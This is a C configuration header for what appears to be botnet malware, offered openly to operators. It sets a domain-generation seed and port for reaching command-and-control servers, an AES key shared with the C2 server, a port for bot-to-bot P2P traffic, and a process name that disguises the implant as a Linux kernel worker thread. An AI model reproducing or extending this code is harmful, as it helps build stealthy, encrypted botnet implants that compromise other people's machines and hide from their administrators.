#ifndef CONFIG_H
#define CONFIG_H

// ====================================================================
// == C2 & COMMUNICATION CONFIGURATION - EDIT THESE VALUES ==
// ====================================================================

// The secret seed for the Domain Generation Algorithm (DGA).
// This MUST match the seed on your C2 server.
#define DGA_SEED "CHANGE_THIS_TO_YOUR_SECRET_DGA_SEED"

// The port your C2 server is listening on.
#define C2_PORT 48101

// The secret AES-256 encryption key.
// This MUST be exactly 32 characters long and match the key on your C2 server.
#define AES_KEY "YOUR_32_CHAR_SECRET_AES_KEY_HERE_"


// ====================================================================
// == OTHER CONFIGURATION ==
// ====================================================================

// P2P Configuration (for bot-to-bot communication, if enabled)
#define P2P_PORT 48102

// The name the process will be disguised as.
#define HIDE_PROCESS_NAME "[kworker/u8:2]"

#endif // CONFIG_H
